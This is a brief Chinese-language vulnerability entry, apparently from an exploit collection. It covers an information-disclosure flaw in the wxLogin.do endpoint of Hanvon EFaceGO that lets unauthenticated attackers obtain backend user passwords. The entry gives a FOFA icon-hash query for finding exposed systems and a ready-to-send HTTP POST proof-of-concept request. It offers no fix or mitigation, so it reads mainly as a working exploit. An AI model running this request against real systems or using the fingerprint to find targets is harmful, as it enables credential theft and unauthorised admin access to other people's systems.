## 汉王EFaceGO-wxLogin.do-信息泄露漏洞

## 一、漏洞简介
汉王EFaceGO wxLogin.do存在信息泄露漏洞，未经身份验证的远程攻击者可利用此漏洞获取网站后台系统用户密码等敏感信息，从而登录网站后台系统，使网站处于极不安全的状态。

## fofa
```
icon_hash="1380907357"
```

## poc
```
POST /manage/m/wxLogin.do?openid=1&username=admin&password=1&id=1&flag=1 HTTP/1.1
Host: hanvon.mrxn.net
Content-Type: application/x-www-form-urlencoded
```
